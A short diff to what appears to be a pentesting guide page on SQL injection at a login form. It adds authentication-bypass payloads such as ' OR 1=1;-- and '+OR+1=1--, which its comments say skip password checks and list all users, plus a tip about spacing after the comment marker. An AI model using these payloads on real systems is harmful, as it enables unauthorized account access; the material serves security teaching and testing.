@@ -34,13 +34,15 @@ _%user%_ and _%password%_ are the values received on a login form
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
-' OR 1=1;--   #Use this comparison to cheat on verification
+'--   #Use this comparison to cheat on verification
+' OR 1=1;--   #Another alternative
+'+OR+1=1-- #Another alternative
 #This will skip the password verification and enumerate all the users
 ```
 {% endcode %}
 
-{% hint style="warning" %}
-After the `;--` is mandatory to put a space
+{% hint style="info" %}
+Sometimes and extra space after `;--` could make it work
 {% endhint %}
 
 ***
